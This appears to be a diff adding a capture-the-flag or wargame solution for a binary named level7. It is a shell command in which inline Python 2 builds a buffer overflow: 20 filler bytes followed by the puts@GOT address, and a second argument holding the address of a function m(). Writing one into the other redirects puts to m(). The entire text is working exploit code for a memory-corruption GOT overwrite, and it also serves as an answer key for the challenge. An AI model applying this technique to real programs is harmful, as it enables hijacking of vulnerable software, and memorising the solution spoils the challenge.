@@ -1,0 +1,12 @@
+./level7 "$(python2 - <<'PY'
+import sys, struct
+payload = "A"*20
+payload += struct.pack("<I", 0x8049928)  # puts@GOT
+sys.stdout.write(payload + "\n")
+PY
+)" "$(python2 - <<'PY'
+import sys, struct
+payload = struct.pack("<I", 0x80484f4)  # m()
+sys.stdout.write(payload + "\n")
+PY
+)"
